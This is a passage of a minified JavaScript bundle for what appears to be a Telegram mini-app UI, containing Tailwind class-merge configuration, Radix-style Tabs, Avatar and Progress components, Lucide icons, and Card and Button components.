            "flex-direction": [{
                flex: ["row", "row-reverse", "col", "col-reverse"]
            }],
            "flex-wrap": [{
                flex: ["wrap", "wrap-reverse", "nowrap"]
            }],
            flex: [{
                flex: ["1", "auto", "initial", "none", z]
            }],
            grow: [{
                grow: R()
            }],
            shrink: [{
                shrink: R()
            }],
            order: [{
                order: ["first", "last", "none", Jn, z]
            }],
            "grid-cols": [{
                "grid-cols": [Zn]
            }],
            "col-start-end": [{
                col: ["auto", {
                    span: ["full", Jn, z]
                }, z]
            }],
            "col-start": [{
                "col-start": mt()
            }],
            "col-end": [{
                "col-end": mt()
            }],
            "grid-rows": [{
                "grid-rows": [Zn]
            }],
            "row-start-end": [{
                row: ["auto", {
                    span: [Jn, z]
                }, z]
            }],
            "row-start": [{
                "row-start": mt()
            }],
            "row-end": [{
                "row-end": mt()
            }],
            "grid-flow": [{
                "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
            }],
            "auto-cols": [{
                "auto-cols": ["auto", "min", "max", "fr", z]
            }],
            "auto-rows": [{
                "auto-rows": ["auto", "min", "max", "fr", z]
            }],
            gap: [{
                gap: [m]
            }],
            "gap-x": [{
                "gap-x": [m]
            }],
            "gap-y": [{
                "gap-y": [m]
            }],
            "justify-content": [{
                justify: ["normal", "start", "end", "center", "between", "around", "evenly", "stretch"]
            }],
            "justify-items": [{
                "justify-items": ["start", "end", "center", "stretch"]
            }],
            "justify-self": [{
                "justify-self": ["auto", "start", "end", "center", "stretch"]
            }],
            "align-content": [{
                content: ["normal", "start", "end", "center", "between", "around", "evenly", "stretch", "baseline"]
            }],
            "align-items": [{
                items: ["start", "end", "center", "baseline", "stretch"]
            }],
            "align-self": [{
                self: ["auto", "start", "end", "center", "stretch", "baseline"]
            }],
            "place-content": [{
                "place-content": ["start", "end", "center", "between", "around", "evenly", "stretch", "baseline"]
            }],
            "place-items": [{
                "place-items": ["start", "end", "center", "baseline", "stretch"]
            }],
            "place-self": [{
                "place-self": ["auto", "start", "end", "center", "stretch"]
            }],
            p: [{
                p: [d]
            }],
            px: [{
                px: [d]
            }],
            py: [{
                py: [d]
            }],
            ps: [{
                ps: [d]
            }],
            pe: [{
                pe: [d]
            }],
            pt: [{
                pt: [d]
            }],
            pr: [{
                pr: [d]
            }],
            pb: [{
                pb: [d]
            }],
            pl: [{
                pl: [d]
            }],
            m: [{
                m: [S]
            }],
            mx: [{
                mx: [S]
            }],
            my: [{
                my: [S]
            }],
            ms: [{
                ms: [S]
            }],
            me: [{
                me: [S]
            }],
            mt: [{
                mt: [S]
            }],
            mr: [{
                mr: [S]
            }],
            mb: [{
                mb: [S]
            }],
            ml: [{
                ml: [S]
            }],
            "space-x": [{
                "space-x": [T]
            }],
            "space-x-reverse": ["space-x-reverse"],
            "space-y": [{
                "space-y": [T]
            }],
            "space-y-reverse": ["space-y-reverse"],
            w: [{
                w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", z, t]
            }],
            "min-w": [{
                "min-w": [z, t, "min", "max", "fit"]
            }],
            "max-w": [{
                "max-w": [z, t, "none", "full", "min", "max", "fit", "prose", {
                    screen: [gt]
                }, gt]
            }],
            h: [{
                h: [z, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "min-h": [{
                "min-h": [z, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            "max-h": [{
                "max-h": [z, t, "min", "max", "fit", "svh", "lvh", "dvh"]
            }],
            size: [{
                size: [z, t, "auto", "min", "max", "fit"]
            }],
            "font-size": [{
                text: ["base", gt, vt]
            }],
            "font-smoothing": ["antialiased", "subpixel-antialiased"],
            "font-style": ["italic", "not-italic"],
            "font-weight": [{
                font: ["thin", "extralight", "light", "normal", "medium", "semibold", "bold", "extrabold", "black", yo]
            }],
            "font-family": [{
                font: [Zn]
            }],
            "fvn-normal": ["normal-nums"],
            "fvn-ordinal": ["ordinal"],
            "fvn-slashed-zero": ["slashed-zero"],
            "fvn-figure": ["lining-nums", "oldstyle-nums"],
            "fvn-spacing": ["proportional-nums", "tabular-nums"],
            "fvn-fraction": ["diagonal-fractions", "stacked-fractons"],
            tracking: [{
                tracking: ["tighter", "tight", "normal", "wide", "wider", "widest", z]
            }],
            "line-clamp": [{
                "line-clamp": ["none", Qt, yo]
            }],
            leading: [{
                leading: ["none", "tight", "snug", "normal", "relaxed", "loose", et, z]
            }],
            "list-image": [{
                "list-image": ["none", z]
            }],
            "list-style-type": [{
                list: ["none", "disc", "decimal", z]
            }],
            "list-style-position": [{
                list: ["inside", "outside"]
            }],
            "placeholder-color": [{
                placeholder: [e]
            }],
            "placeholder-opacity": [{
                "placeholder-opacity": [f]
            }],
            "text-alignment": [{
                text: ["left", "center", "right", "justify", "start", "end"]
            }],
            "text-color": [{
                text: [e]
            }],
            "text-opacity": [{
                "text-opacity": [f]
            }],
            "text-decoration": ["underline", "overline", "line-through", "no-underline"],
            "text-decoration-style": [{
                decoration: ["solid", "dashed", "dotted", "double", "none", "wavy"]
            }],
            "text-decoration-thickness": [{
                decoration: ["auto", "from-font", et, vt]
            }],
            "underline-offset": [{
                "underline-offset": ["auto", et, z]
            }],
            "text-decoration-color": [{
                decoration: [e]
            }],
            "text-transform": ["uppercase", "lowercase", "capitalize", "normal-case"],
            "text-overflow": ["truncate", "text-ellipsis", "text-clip"],
            "text-wrap": [{
                text: ["wrap", "nowrap", "balance", "pretty"]
            }],
            indent: [{
                indent: A()
            }],
            "vertical-align": [{
                align: ["baseline", "top", "middle", "bottom", "text-top", "text-bottom", "sub", "super", z]
            }],
            whitespace: [{
                whitespace: ["normal", "nowrap", "pre", "pre-line", "pre-wrap", "break-spaces"]
            }],
            break: [{
                break: ["normal", "words", "all", "keep"]
            }],
            hyphens: [{
                hyphens: ["none", "manual", "auto"]
            }],
            content: [{
                content: ["none", z]
            }],
            "bg-attachment": [{
                bg: ["fixed", "local", "scroll"]
            }],
            "bg-clip": [{
                "bg-clip": ["border", "padding", "content", "text"]
            }],
            "bg-opacity": [{
                "bg-opacity": [f]
            }],
            "bg-origin": [{
                "bg-origin": ["border", "padding", "content"]
            }],
            "bg-position": [{
                bg: ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top", uy]
            }],
            "bg-repeat": [{
                bg: ["no-repeat", {
                    repeat: ["", "x", "y", "round", "space"]
                }]
            }],
            "bg-size": [{
                bg: ["auto", "cover", "contain", sy]
            }],
            "bg-image": [{
                bg: ["none", {
                    "gradient-to": ["t", "tr", "r", "br", "b", "bl", "l", "tl"]
                }, cy]
            }],
            "bg-color": [{
                bg: [e]
            }],
            "gradient-from-pos": [{
                from: [w]
            }],
            "gradient-via-pos": [{
                via: [w]
            }],
            "gradient-to-pos": [{
                to: [w]
            }],
            "gradient-from": [{
                from: [g]
            }],
            "gradient-via": [{
                via: [g]
            }],
            "gradient-to": [{
                to: [g]
            }],
            rounded: [{
                rounded: [l]
            }],
            "rounded-s": [{
                "rounded-s": [l]
            }],
            "rounded-e": [{
                "rounded-e": [l]
            }],
            "rounded-t": [{
                "rounded-t": [l]
            }],
            "rounded-r": [{
                "rounded-r": [l]
            }],
            "rounded-b": [{
                "rounded-b": [l]
            }],
            "rounded-l": [{
                "rounded-l": [l]
            }],
            "rounded-ss": [{
                "rounded-ss": [l]
            }],
            "rounded-se": [{
                "rounded-se": [l]
            }],
            "rounded-ee": [{
                "rounded-ee": [l]
            }],
            "rounded-es": [{
                "rounded-es": [l]
            }],
            "rounded-tl": [{
                "rounded-tl": [l]
            }],
            "rounded-tr": [{
                "rounded-tr": [l]
            }],
            "rounded-br": [{
                "rounded-br": [l]
            }],
            "rounded-bl": [{
                "rounded-bl": [l]
            }],
            "border-w": [{
                border: [s]
            }],
            "border-w-x": [{
                "border-x": [s]
            }],
            "border-w-y": [{
                "border-y": [s]
            }],
            "border-w-s": [{
                "border-s": [s]
            }],
            "border-w-e": [{
                "border-e": [s]
            }],
            "border-w-t": [{
                "border-t": [s]
            }],
            "border-w-r": [{
                "border-r": [s]
            }],
            "border-w-b": [{
                "border-b": [s]
            }],
            "border-w-l": [{
                "border-l": [s]
            }],
            "border-opacity": [{
                "border-opacity": [f]
            }],
            "border-style": [{
                border: ["solid", "dashed", "dotted", "double", "none", "hidden"]
            }],
            "divide-x": [{
                "divide-x": [s]
            }],
            "divide-x-reverse": ["divide-x-reverse"],
            "divide-y": [{
                "divide-y": [s]
            }],
            "divide-y-reverse": ["divide-y-reverse"],
            "divide-opacity": [{
                "divide-opacity": [f]
            }],
            "divide-style": [{
                divide: ["solid", "dashed", "dotted", "double", "none"]
            }],
            "border-color": [{
                border: [o]
            }],
            "border-color-x": [{
                "border-x": [o]
            }],
            "border-color-y": [{
                "border-y": [o]
            }],
            "border-color-t": [{
                "border-t": [o]
            }],
            "border-color-r": [{
                "border-r": [o]
            }],
            "border-color-b": [{
                "border-b": [o]
            }],
            "border-color-l": [{
                "border-l": [o]
            }],
            "divide-color": [{
                divide: [o]
            }],
            "outline-style": [{
                outline: ["", "solid", "dashed", "dotted", "double", "none"]
            }],
            "outline-offset": [{
                "outline-offset": [et, z]
            }],
            "outline-w": [{
                outline: [et, vt]
            }],
            "outline-color": [{
                outline: [e]
            }],
            "ring-w": [{
                ring: Ge()
            }],
            "ring-w-inset": ["ring-inset"],
            "ring-color": [{
                ring: [e]
            }],
            "ring-opacity": [{
                "ring-opacity": [f]
            }],
            "ring-offset-w": [{
                "ring-offset": [et, vt]
            }],
            "ring-offset-color": [{
                "ring-offset": [e]
            }],
            shadow: [{
                shadow: ["", "inner", "none", gt, dy]
            }],
            "shadow-color": [{
                shadow: [Zn]
            }],
            opacity: [{
                opacity: [f]
            }],
            "mix-blend": [{
                "mix-blend": ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity", "plus-lighter", "plus-darker"]
            }],
            "bg-blend": [{
                "bg-blend": ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
            }],
            filter: [{
                filter: ["", "none"]
            }],
            blur: [{
                blur: [n]
            }],
            brightness: [{
                brightness: [r]
            }],
            contrast: [{
                contrast: [u]
            }],
            "drop-shadow": [{
                "drop-shadow": ["", "none", gt, z]
            }],
            grayscale: [{
                grayscale: [a]
            }],
            "hue-rotate": [{
                "hue-rotate": [c]
            }],
            invert: [{
                invert: [p]
            }],
            saturate: [{
                saturate: [h]
            }],
            sepia: [{
                sepia: [k]
            }],
            "backdrop-filter": [{
                "backdrop-filter": ["", "none"]
            }],
            "backdrop-blur": [{
                "backdrop-blur": [n]
            }],
            "backdrop-brightness": [{
                "backdrop-brightness": [r]
            }],
            "backdrop-contrast": [{
                "backdrop-contrast": [u]
            }],
            "backdrop-grayscale": [{
                "backdrop-grayscale": [a]
            }],
            "backdrop-hue-rotate": [{
                "backdrop-hue-rotate": [c]
            }],
            "backdrop-invert": [{
                "backdrop-invert": [p]
            }],
            "backdrop-opacity": [{
                "backdrop-opacity": [f]
            }],
            "backdrop-saturate": [{
                "backdrop-saturate": [h]
            }],
            "backdrop-sepia": [{
                "backdrop-sepia": [k]
            }],
            "border-collapse": [{
                border: ["collapse", "separate"]
            }],
            "border-spacing": [{
                "border-spacing": [i]
            }],
            "border-spacing-x": [{
                "border-spacing-x": [i]
            }],
            "border-spacing-y": [{
                "border-spacing-y": [i]
            }],
            "table-layout": [{
                table: ["auto", "fixed"]
            }],
            caption: [{
                caption: ["top", "bottom"]
            }],
            transition: [{
                transition: ["none", "all", "", "colors", "opacity", "shadow", "transform", z]
            }],
            duration: [{
                duration: B()
            }],
            ease: [{
                ease: ["linear", "in", "out", "in-out", z]
            }],
            delay: [{
                delay: B()
            }],
            animate: [{
                animate: ["none", "spin", "ping", "pulse", "bounce", z]
            }],
            transform: [{
                transform: ["", "gpu", "none"]
            }],
            scale: [{
                scale: [_]
            }],
            "scale-x": [{
                "scale-x": [_]
            }],
            "scale-y": [{
                "scale-y": [_]
            }],
            rotate: [{
                rotate: [Jn, z]
            }],
            "translate-x": [{
                "translate-x": [C]
            }],
            "translate-y": [{
                "translate-y": [C]
            }],
            "skew-x": [{
                "skew-x": [I]
            }],
            "skew-y": [{
                "skew-y": [I]
            }],
            "transform-origin": [{
                origin: ["center", "top", "top-right", "right", "bottom-right", "bottom", "bottom-left", "left", "top-left", z]
            }],
            accent: [{
                accent: ["auto", e]
            }],
            appearance: [{
                appearance: ["none", "auto"]
            }],
            cursor: [{
                cursor: ["auto", "default", "pointer", "wait", "text", "move", "help", "not-allowed", "none", "context-menu", "progress", "cell", "crosshair", "vertical-text", "alias", "copy", "no-drop", "grab", "grabbing", "all-scroll", "col-resize", "row-resize", "n-resize", "e-resize", "s-resize", "w-resize", "ne-resize", "nw-resize", "se-resize", "sw-resize", "ew-resize", "ns-resize", "nesw-resize", "nwse-resize", "zoom-in", "zoom-out", z]
            }],
            "caret-color": [{
                caret: [e]
            }],
            "pointer-events": [{
                "pointer-events": ["none", "auto"]
            }],
            resize: [{
                resize: ["none", "y", "x", ""]
            }],
            "scroll-behavior": [{
                scroll: ["auto", "smooth"]
            }],
            "scroll-m": [{
                "scroll-m": A()
            }],
            "scroll-mx": [{
                "scroll-mx": A()
            }],
            "scroll-my": [{
                "scroll-my": A()
            }],
            "scroll-ms": [{
                "scroll-ms": A()
            }],
            "scroll-me": [{
                "scroll-me": A()
            }],
            "scroll-mt": [{
                "scroll-mt": A()
            }],
            "scroll-mr": [{
                "scroll-mr": A()
            }],
            "scroll-mb": [{
                "scroll-mb": A()
            }],
            "scroll-ml": [{
                "scroll-ml": A()
            }],
            "scroll-p": [{
                "scroll-p": A()
            }],
            "scroll-px": [{
                "scroll-px": A()
            }],
            "scroll-py": [{
                "scroll-py": A()
            }],
            "scroll-ps": [{
                "scroll-ps": A()
            }],
            "scroll-pe": [{
                "scroll-pe": A()
            }],
            "scroll-pt": [{
                "scroll-pt": A()
            }],
            "scroll-pr": [{
                "scroll-pr": A()
            }],
            "scroll-pb": [{
                "scroll-pb": A()
            }],
            "scroll-pl": [{
                "scroll-pl": A()
            }],
            "snap-align": [{
                snap: ["start", "end", "center", "align-none"]
            }],
            "snap-stop": [{
                snap: ["normal", "always"]
            }],
            "snap-type": [{
                snap: ["none", "x", "y", "both"]
            }],
            "snap-strictness": [{
                snap: ["mandatory", "proximity"]
            }],
            touch: [{
                touch: ["auto", "none", "manipulation"]
            }],
            "touch-x": [{
                "touch-pan": ["x", "left", "right"]
            }],
            "touch-y": [{
                "touch-pan": ["y", "up", "down"]
            }],
            "touch-pz": ["touch-pinch-zoom"],
            select: [{
                select: ["none", "text", "all", "auto"]
            }],
            "will-change": [{
                "will-change": ["auto", "scroll", "contents", "transform", z]
            }],
            fill: [{
                fill: [e, "none"]
            }],
            "stroke-w": [{
                stroke: [et, vt, yo]
            }],
            stroke: [{
                stroke: [e, "none"]
            }],
            sr: ["sr-only", "not-sr-only"],
            "forced-color-adjust": [{
                "forced-color-adjust": ["auto", "none"]
            }]
        },
        conflictingClassGroups: {
            overflow: ["overflow-x", "overflow-y"],
            overscroll: ["overscroll-x", "overscroll-y"],
            inset: ["inset-x", "inset-y", "start", "end", "top", "right", "bottom", "left"],
            "inset-x": ["right", "left"],
            "inset-y": ["top", "bottom"],
            flex: ["basis", "grow", "shrink"],
            gap: ["gap-x", "gap-y"],
            p: ["px", "py", "ps", "pe", "pt", "pr", "pb", "pl"],
            px: ["pr", "pl"],
            py: ["pt", "pb"],
            m: ["mx", "my", "ms", "me", "mt", "mr", "mb", "ml"],
            mx: ["mr", "ml"],
            my: ["mt", "mb"],
            size: ["w", "h"],
            "font-size": ["leading"],
            "fvn-normal": ["fvn-ordinal", "fvn-slashed-zero", "fvn-figure", "fvn-spacing", "fvn-fraction"],
            "fvn-ordinal": ["fvn-normal"],
            "fvn-slashed-zero": ["fvn-normal"],
            "fvn-figure": ["fvn-normal"],
            "fvn-spacing": ["fvn-normal"],
            "fvn-fraction": ["fvn-normal"],
            "line-clamp": ["display", "overflow"],
            rounded: ["rounded-s", "rounded-e", "rounded-t", "rounded-r", "rounded-b", "rounded-l", "rounded-ss", "rounded-se", "rounded-ee", "rounded-es", "rounded-tl", "rounded-tr", "rounded-br", "rounded-bl"],
            "rounded-s": ["rounded-ss", "rounded-es"],
            "rounded-e": ["rounded-se", "rounded-ee"],
            "rounded-t": ["rounded-tl", "rounded-tr"],
            "rounded-r": ["rounded-tr", "rounded-br"],
            "rounded-b": ["rounded-br", "rounded-bl"],
            "rounded-l": ["rounded-tl", "rounded-bl"],
            "border-spacing": ["border-spacing-x", "border-spacing-y"],
            "border-w": ["border-w-s", "border-w-e", "border-w-t", "border-w-r", "border-w-b", "border-w-l"],
            "border-w-x": ["border-w-r", "border-w-l"],
            "border-w-y": ["border-w-t", "border-w-b"],
            "border-color": ["border-color-t", "border-color-r", "border-color-b", "border-color-l"],
            "border-color-x": ["border-color-r", "border-color-l"],
            "border-color-y": ["border-color-t", "border-color-b"],
            "scroll-m": ["scroll-mx", "scroll-my", "scroll-ms", "scroll-me", "scroll-mt", "scroll-mr", "scroll-mb", "scroll-ml"],
            "scroll-mx": ["scroll-mr", "scroll-ml"],
            "scroll-my": ["scroll-mt", "scroll-mb"],
            "scroll-p": ["scroll-px", "scroll-py", "scroll-ps", "scroll-pe", "scroll-pt", "scroll-pr", "scroll-pb", "scroll-pl"],
            "scroll-px": ["scroll-pr", "scroll-pl"],
            "scroll-py": ["scroll-pt", "scroll-pb"],
            touch: ["touch-x", "touch-y", "touch-pz"],
            "touch-x": ["touch"],
            "touch-y": ["touch"],
            "touch-pz": ["touch"]
        },
        conflictingClassGroupModifiers: {
            "font-size": ["leading"]
        }
    }
}
const vy = Jg(hy);

function de(...e) {
    return vy(Dg(e))
}
const gy = $g,
    lp = x.forwardRef((({
        className: e,
        ...t
    }, n) => v.jsx(Xf, {
        ref: n,
        className: de("inline-flex h-10 items-center justify-center rounded-md bg-muted p-1 text-muted-foreground", e),
        ...t
    })));
lp.displayName = Xf.displayName;
const rr = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx(Jf, {
    ref: n,
    className: de("inline-flex items-center justify-center whitespace-nowrap rounded-sm px-3 py-1.5 text-sm font-medium ring-offset-background transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 data-[state=active]:bg-background data-[state=active]:text-foreground data-[state=active]:shadow-sm", e),
    ...t
})));
rr.displayName = Jf.displayName;
const or = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx(Zf, {
    ref: n,
    className: de("mt-2 ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2", e),
    ...t
})));
or.displayName = Zf.displayName;
var ju = "Avatar",
    [yy, Q0] = br(ju),
    [wy, ip] = yy(ju),
    sp = x.forwardRef(((e, t) => {
        const {
            __scopeAvatar: n,
            ...r
        } = e, [o, l] = x.useState("idle");
        return v.jsx(wy, {
            scope: n,
            imageLoadingStatus: o,
            onImageLoadingStatusChange: l,
            children: v.jsx(Be.span, {
                ...r,
                ref: t
            })
        })
    }));
sp.displayName = ju;
var up = "AvatarImage",
    ap = x.forwardRef(((e, t) => {
        const {
            __scopeAvatar: n,
            src: r,
            onLoadingStatusChange: o = (() => { }),
            ...l
        } = e, i = ip(up, n), s = xy(r), u = zl((a => {
            o(a), i.onImageLoadingStatusChange(a)
        }));
        return Or((() => {
            "idle" !== s && u(s)
        }), [s, u]), "loaded" === s ? v.jsx(Be.img, {
            ...l,
            ref: t,
            src: r
        }) : null
    }));
ap.displayName = up;
var cp = "AvatarFallback",
    dp = x.forwardRef(((e, t) => {
        const {
            __scopeAvatar: n,
            delayMs: r,
            ...o
        } = e, l = ip(cp, n), [i, s] = x.useState(void 0 === r);
        return x.useEffect((() => {
            if (void 0 !== r) {
                const u = window.setTimeout((() => s(!0)), r);
                return () => window.clearTimeout(u)
            }
        }), [r]), i && "loaded" !== l.imageLoadingStatus ? v.jsx(Be.span, {
            ...o,
            ref: t
        }) : null
    }));

function xy(e) {
    const [t, n] = x.useState("idle");
    return Or((() => {
        if (!e) return void n("error");
        let r = !0;
        const o = new window.Image,
            l = i => () => {
                r && n(i)
            };
        return n("loading"), o.onload = l("loaded"), o.onerror = l("error"), o.src = e, () => {
            r = !1
        }
    }), [e]), t
}
dp.displayName = cp;
var fp = sp,
    pp = ap,
    mp = dp;
const hp = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx(fp, {
    ref: n,
    className: de("relative flex h-10 w-10 shrink-0 overflow-hidden rounded-full", e),
    ...t
})));
hp.displayName = fp.displayName;
const vp = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx(pp, {
    ref: n,
    className: de("aspect-square h-full w-full", e),
    ...t
})));
vp.displayName = pp.displayName;
const gp = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx(mp, {
    ref: n,
    className: de("flex h-full w-full items-center justify-center rounded-full bg-muted", e),
    ...t
})));
gp.displayName = mp.displayName;
const Se = window.Telegram.WebApp.initDataUnsafe.user;

function Sy() {
    return null
}
const _y = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase(),
    yp = (...e) => e.filter(((t, n, r) => !!t && r.indexOf(t) === n)).join(" ");
var Ey = {
    xmlns: "http://www.w3.org/2000/svg",
    width: 24,
    height: 24,
    viewBox: "0 0 24 24",
    fill: "none",
    stroke: "currentColor",
    strokeWidth: 2,
    strokeLinecap: "round",
    strokeLinejoin: "round"
};
const ky = x.forwardRef((({
    color: e = "currentColor",
    size: t = 24,
    strokeWidth: n = 2,
    absoluteStrokeWidth: r,
    className: o = "",
    children: l,
    iconNode: i,
    ...s
}, u) => x.createElement("svg", {
    ref: u,
    ...Ey,
    width: t,
    height: t,
    stroke: e,
    strokeWidth: r ? 24 * Number(n) / Number(t) : n,
    className: yp("lucide", o),
    ...s
}, [...i.map((([a, c]) => x.createElement(a, c))), ...Array.isArray(l) ? l : [l]]))),
    Ou = (e, t) => {
        const n = x.forwardRef((({
            className: r,
            ...o
        }, l) => x.createElement(ky, {
            ref: l,
            iconNode: t,
            className: yp(`lucide-${_y(e)}`, r),
            ...o
        })));
        return n.displayName = `${e}`, n
    },
    Ml = Ou("ClipboardCheck", [
        ["rect", {
            width: "8",
            height: "4",
            x: "8",
            y: "2",
            rx: "1",
            ry: "1",
            key: "tgr4d6"
        }],
        ["path", {
            d: "M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2",
            key: "116196"
        }],
        ["path", {
            d: "m9 14 2 2 4-4",
            key: "df797q"
        }]
    ]),
    Al = Ou("Copy", [
        ["rect", {
            width: "14",
            height: "14",
            x: "8",
            y: "8",
            rx: "2",
            ry: "2",
            key: "17jyea"
        }],
        ["path", {
            d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",
            key: "zix9uf"
        }]
    ]),
    $l = Ou("WandSparkles", [
        ["path", {
            d: "m21.64 3.64-1.28-1.28a1.21 1.21 0 0 0-1.72 0L2.36 18.64a1.21 1.21 0 0 0 0 1.72l1.28 1.28a1.2 1.2 0 0 0 1.72 0L21.64 5.36a1.2 1.2 0 0 0 0-1.72",
            key: "ul74o6"
        }],
        ["path", {
            d: "m14 7 3 3",
            key: "1r5n42"
        }],
        ["path", {
            d: "M5 6v4",
            key: "ilb8ba"
        }],
        ["path", {
            d: "M19 14v4",
            key: "blhpug"
        }],
        ["path", {
            d: "M10 2v2",
            key: "7u0qdc"
        }],
        ["path", {
            d: "M7 8H3",
            key: "zfb6yr"
        }],
        ["path", {
            d: "M21 16h-4",
            key: "1cnmox"
        }],
        ["path", {
            d: "M11 3H9",
            key: "1obp7u"
        }]
    ]),
    Wr = x.forwardRef((({
        className: e,
        ...t
    }, n) => v.jsx("div", {
        ref: n,
        className: de("rounded-lg border bg-card text-card-foreground shadow-sm", e),
        ...t
    })));
Wr.displayName = "Card";
const Hr = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx("div", {
    ref: n,
    className: de("flex flex-col space-y-1.5 p-6", e),
    ...t
})));
Hr.displayName = "CardHeader";
const Br = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx("h3", {
    ref: n,
    className: de("text-2xl font-semibold leading-none tracking-tight", e),
    ...t
})));
Br.displayName = "CardTitle";
const Gr = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx("p", {
    ref: n,
    className: de("text-sm text-muted-foreground", e),
    ...t
})));
Gr.displayName = "CardDescription";
const Kr = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx("div", {
    ref: n,
    className: de("p-6 pt-0", e),
    ...t
})));
Kr.displayName = "CardContent";
const Qr = x.forwardRef((({
    className: e,
    ...t
}, n) => v.jsx("div", {
    ref: n,
    className: de("flex items-center p-6 pt-0", e),
    ...t
})));

function wp(e) {
    var t, n, r = "";
    if ("string" == typeof e || "number" == typeof e) r += e;
    else if ("object" == typeof e)
        if (Array.isArray(e))
            for (t = 0; t < e.length; t++) e[t] && (n = wp(e[t])) && (r && (r += " "), r += n);
        else
            for (t in e) e[t] && (r && (r += " "), r += t);
    return r
}

function Cy() {
    for (var e, t, n = 0, r = ""; n < arguments.length;)(e = arguments[n++]) && (t = wp(e)) && (r && (r += " "), r += t);
    return r
}
Qr.displayName = "CardFooter";
const Xa = e => "boolean" == typeof e ? "".concat(e) : 0 === e ? "0" : e,
    Ja = Cy,
    Ny = (e, t) => n => {
        var r;
        if (null == (null == t ? void 0 : t.variants)) return Ja(e, null == n ? void 0 : n.class, null == n ? void 0 : n.className);
        const {
            variants: o,
            defaultVariants: l
        } = t, i = Object.keys(o).map((a => {
            const c = null == n ? void 0 : n[a],
                p = null == l ? void 0 : l[a];
            if (null === c) return null;
            const m = Xa(c) || Xa(p);
            return o[a][m]
        })), s = n && Object.entries(n).reduce(((a, c) => {
            let [p, m] = c;
            return void 0 === m || (a[p] = m), a
        }), {}), u = null == t || null === (r = t.compoundVariants) || void 0 === r ? void 0 : r.reduce(((a, c) => {
            let {
                class: p,
                className: m,
                ...g
            } = c;
            return Object.entries(g).every((w => {
                let [y, S] = w;
                return Array.isArray(S) ? S.includes({
                    ...l,
                    ...s
                }[y]) : {
                    ...l,
                    ...s
                }[y] === S
            })) ? [...a, p, m] : a
        }), []);
        return Ja(e, i, u, null == n ? void 0 : n.class, null == n ? void 0 : n.className)
    },
    Py = Ny("inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50", {
        variants: {
            variant: {
                default: "bg-primary text-primary-foreground hover:bg-primary/90",
                destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
                outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
                secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
                ghost: "hover:bg-accent hover:text-accent-foreground",
                link: "text-primary underline-offset-4 hover:underline"
            },
            size: {
                default: "h-10 px-4 py-2",
                sm: "h-9 rounded-md px-3",
                lg: "h-11 rounded-md px-8",
                icon: "h-10 w-10"
            }
        },
        defaultVariants: {
            variant: "default",
            size: "default"
        }
    }),
    ft = x.forwardRef((({
        className: e,
        variant: t,
        size: n,
        asChild: r = !1,
        ...o
    }, l) => {
        const i = r ? jr : "button";
        return v.jsx(i, {
            className: de(Py({
                variant: t,
                size: n,
                className: e
            })),
            ref: l,
            ...o
        })
    }));
ft.displayName = "Button";
var zu = "Progress",
    Lu = 100,
    [Ty, Y0] = br(zu),
    [Iy, Ry] = Ty(zu),
    xp = x.forwardRef(((e, t) => {
        const {
            __scopeProgress: n,
            value: r = null,
            max: o,
            getValueLabel: l = jy,
            ...i
        } = e;
        (o || 0 === o) && !Za(o) && console.error(Oy(`${o}`, "Progress"));
        const s = Za(o) ? o : Lu;
        null !== r && !qa(r, s) && console.error(zy(`${r}`, "Progress"));
        const u = qa(r, s) ? r : null,
            a = fl(u) ? l(u, s) : void 0;
        return v.jsx(Iy, {
            scope: n,
            value: u,
            max: s,
            children: v.jsx(Be.div, {
                "aria-valuemax": s,
                "aria-valuemin": 0,
                "aria-valuenow": fl(u) ? u : void 0,
                "aria-valuetext": a,
                role: "progressbar",
                "data-state": Ep(u, s),
                "data-value": u ?? void 0,
                "data-max": s,
                ...i,
                ref: t
            })
        })
    }));
xp.displayName = zu;
var Sp = "ProgressIndicator",
    _p = x.forwardRef(((e, t) => {
        const {
            __scopeProgress: n,
            ...r
        } = e, o = Ry(Sp, n);
        return v.jsx(Be.div, {
            "data-state": Ep(o.value, o.max),
            "data-value": o.value ?? void 0,
            "data-max": o.max,
            ...r,
            ref: t
        })
    }));

function jy(e, t) {
    return `${Math.round(e / t * 100)}%`
}

function Ep(e, t) {
    return null == e ? "indeterminate" : e === t ? "complete" : "loading"
}

function fl(e) {
    return "number" == typeof e
}

function Za(e) {
    return fl(e) && !isNaN(e) && e > 0
}

function qa(e, t) {
    return fl(e) && !isNaN(e) && e <= t && e >= 0
}

function Oy(e, t) {
    return `Invalid prop \`max\` of value \`${e}\` supplied to \`${t}\`. Only numbers greater than 0 are valid max values. Defaulting to \`${Lu}\`.`
}

function zy(e, t) {
